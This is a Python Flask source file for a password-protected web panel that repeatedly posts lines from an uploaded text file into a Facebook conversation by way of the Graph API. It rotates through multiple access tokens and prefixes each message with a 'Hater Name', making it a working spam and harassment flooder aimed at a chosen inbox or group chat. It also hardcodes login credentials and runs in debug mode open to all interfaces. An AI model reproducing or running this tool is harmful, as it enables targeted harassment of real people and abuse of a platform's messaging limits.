from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
import threading
import requests
import os
import time
from colorama import Fore, init
import random
import string
from functools import wraps

# Initialize colorama
init(autoreset=True)

app = Flask(__name__)
app.debug = True
app.secret_key = os.urandom(24)  # Secret key for session management

# Hardcoded username and password (in production, use a database)
VALID_USERNAME = "RAVIRAJ"
VALID_PASSWORD = "ATTITUDE@123"

tasks = {}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# Login required decorator
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Function to generate random task id
def generate_random_id(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Background function to send messages
def send_messages(task_id, token_type, access_token, thread_id, messages, mn, time_interval, tokens=None):
    tasks[task_id] = {'running': True}

    token_index = 0
    while tasks[task_id]['running']:
        for message1 in messages:
            if not tasks[task_id]['running']:
                break
            try:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                if token_type == 'single':
                    current_token = access_token
                else:
                    current_token = tokens[token_index]
                    token_index = (token_index + 1) % len(tokens)

                parameters = {'access_token': current_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)

                if response.status_code == 200:
                    print(Fore.GREEN + f"Message sent using token {current_token}: {message}")
                else:
                    print(Fore.RED + f"Failed to send message using token {current_token}: {message}")

                time.sleep(time_interval)
            except Exception as e:
                print(Fore.GREEN + f"Error while sending message using token {current_token}: {message}")
                print(e)
                time.sleep(30)

    print(Fore.YELLOW + f"Task {task_id} stopped.")

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == VALID_USERNAME and password == VALID_PASSWORD:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return render_template_string('''
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Login Failed</title>
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
                <style>
                    body {
                        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
                        height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        font-family: 'Arial', sans-serif;
                    }
                    .login-container {
                        background-color: rgba(255, 255, 255, 0.1);
                        backdrop-filter: blur(10px);
                        border-radius: 15px;
                        padding: 30px;
                        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                        width: 350px;
                        text-align: center;
                        border: 1px solid rgba(255, 255, 255, 0.2);
                    }
                    .login-header {
                        color: #fff;
                        margin-bottom: 25px;
                        text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
                    }
                    .form-control {
                        background-color: rgba(255, 255, 255, 0.1);
                        border: none;
                        color: #fff;
                        border-radius: 20px;
                        margin-bottom: 15px;
                    }
                    .form-control::placeholder {
                        color: rgba(255, 255, 255, 0.6);
                    }
                    .form-control:focus {
                        background-color: rgba(255, 255, 255, 0.2);
                        box-shadow: none;
                        color: #fff;
                    }
                    .btn-login {
                        background: linear-gradient(45deg, #ff416c, #ff4b2b);
                        border: none;
                        border-radius: 20px;
                        padding: 10px;
                        width: 100%;
                        font-weight: bold;
                        margin-top: 10px;
                        transition: all 0.3s;
                    }
                    .btn-login:hover {
                        transform: translateY(-2px);
                        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
                    }
                    .alert {
                        border-radius: 15px;
                        background-color: rgba(255, 0, 0, 0.2);
                        color: #ffcccc;
                        border: none;
                    }
                </style>
            </head>
            <body>
                <div class="login-container">
                    <h3 class="login-header">꧁✨RAVIRAJ ATTITUDE࿐✨꧂</h3>
                    <div class="alert alert-danger" role="alert">
                        Invalid credentials! Please try again.
                    </div>
                    <form method="post">
                        <input type="text" class="form-control" name="username" placeholder="Username" required>
                        <input type="password" class="form-control" name="password" placeholder="Password" required>
                        <button type="submit" class="btn btn-login">Login</button>
                    </form>
                </div>
            </body>
            </html>
            ''')
    
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                font-family: 'Arial', sans-serif;
            }
            .login-container {
                background-color: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 15px;
                padding: 30px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                width: 350px;
                text-align: center;
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
            .login-header {
                color: #fff;
                margin-bottom: 25px;
                text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            }
            .form-control {
                background-color: rgba(255, 255, 255, 0.1);
                border: none;
                color: #fff;
                border-radius: 20px;
                margin-bottom: 15px;
            }
            .form-control::placeholder {
                color: rgba(255, 255, 255, 0.6);
            }
            .form-control:focus {
                background-color: rgba(255, 255, 255, 0.2);
                box-shadow: none;
                color: #fff;
            }
            .btn-login {
                background: linear-gradient(45deg, #ff416c, #ff4b2b);
                border: none;
                border-radius: 20px;
                padding: 10px;
                width: 100%;
                font-weight: bold;
                margin-top: 10px;
                transition: all 0.3s;
            }
            .btn-login:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h3 class="login-header">꧁✨RAVIRAJ ATTITUDE࿐✨꧂</h3>
            <form method="post">
                <input type="text" class="form-control" name="username" placeholder="Username" required>
                <input type="password" class="form-control" name="password" placeholder="Password" required>
                <button type="submit" class="btn btn-login">Login</button>
            </form>
        </div>
    </body>
    </html>
    ''')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/', methods=['GET', 'POST'])
@login_required
def index():
    if request.method == 'POST':
        token_type = request.form.get('tokenType')
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if token_type == 'multi':
            token_file = request.files['tokenFile']
            tokens = token_file.read().decode().splitlines()
        else:
            tokens = None

        # Generate random task id
        task_id = generate_random_id()

        # Start the background thread
        thread = threading.Thread(target=send_messages, args=(task_id, token_type, access_token, thread_id, messages, mn, time_interval, tokens))
        thread.start()

        return jsonify({'task_id': task_id})

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Message Sender</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      min-height: 100vh;
      font-family: 'Arial', sans-serif;
      color: #fff;
    }
    .container {
      max-width: 400px;
      background-color: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border-radius: 15px;
      padding: 20px;
      margin: 0 auto;
      margin-top: 20px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    .header {
      text-align: center;
      padding-bottom: 10px;
      text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
    }
    .btn-submit {
      width: 100%;
      margin-top: 10px;
      background: linear-gradient(45deg, #ff416c, #ff4b2b);
      border: none;
      border-radius: 20px;
      padding: 10px;
      font-weight: bold;
      transition: all 0.3s;
    }
    .btn-submit:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    }
    .btn-danger {
      border-radius: 20px;
    }
    .footer {
      text-align: center;
      margin-top: 10px;
      color: #ffcc00;
      text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
    }
    .form-control {
      background-color: rgba(255, 255, 255, 0.1);
      border: none;
      color: #fff;
      border-radius: 10px;
    }
    .form-control::placeholder {
      color: rgba(255, 255, 255, 0.6);
    }
    .form-control:focus {
      background-color: rgba(255, 255, 255, 0.2);
      box-shadow: none;
      color: #fff;
    }
    label {
      font-weight: bold;
      margin-bottom: 5px;
      display: block;
    }
    .user-info {
      text-align: right;
      padding: 10px;
      color: #ffcc00;
    }
  </style>
</head>
<body>
  <div class="user-info">
    Welcome, {{ session.username }}! | <a href="/logout" style="color: #ff6666;">Logout</a>
  </div>

  <header class="header mt-4">
    <h1 class="mb-3">꧁✨RAVIRAJ ATTITUDE࿐✨꧂༺✮•°◤✎﹏ẸϻỖŤĮỖŇÃĹ✎﹏ŜẸŘϋẸŘ✎﹏ŤÃβÃĤĮ✎﹏ỖŇ✎﹏ƑĮŘẸ✎﹏ỖƑƑĮČĮÃĹ✎﹏ŜĮŤẸ..◥°•✮༻</h1>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenType">Select Token Type:</label>
        <select class="form-control" id="tokenType" name="tokenType" required>
          <option value="single">Single Token</option>
          <option value="multi">Multi Token</option>
        </select>
      </div>
      <div class="mb-3">
        <label for="accessToken">Enter Your Token:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken">
      </div>
      <div class="mb-3">
        <label for="threadId">Enter Convo/Inbox ID:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">Enter Hater Name:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your Notepad File:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3" id="multiTokenFile" style="display: none;">
        <label for="tokenFile">Select Token File (for multi-token):</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
      </div>
      <div class="mb-3">
        <label for="time">Speed in Seconds:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Start Task</button>
    </form>
  </div>

  <div class="container mt-4">
    <h3>Stop Task</h3>
    <form action="/stop_task" method="post">
      <div class="mb-3">
        <label for="taskId">Enter Task ID:</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit">Stop Task</button>
    </form>
  </div>

  <footer class="footer">
    <p>&copy; Developed by ꧁§༺⚔ᴿᴬᵛᴵঔᴬᵀᵀᴵᵀᵁᴰᴱঔᴮᴼᵞ⚔༻§꧂ 2025. All Rights Reserved.</p>
  </footer>

  <script>
    document.getElementById('tokenType').addEventListener('change', function() {
      var tokenType = this.value;
      document.getElementById('multiTokenFile').style.display = tokenType === 'multi' ? 'block' : 'none';
      document.getElementById('accessToken').style.display = tokenType === 'multi' ? 'none' : 'block';
    });
  </script>
</body>
</html>
''')

@app.route('/stop_task', methods=['POST'])
@login_required
def stop_task():
    """Stop a running task based on the task ID."""
    task_id = request.form.get('taskId')
    if task_id in tasks:
        tasks[task_id]['running'] = False
        return jsonify({'status': 'stopped', 'task_id': task_id})
    return jsonify({'status': 'not found', 'task_id': task_id}), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
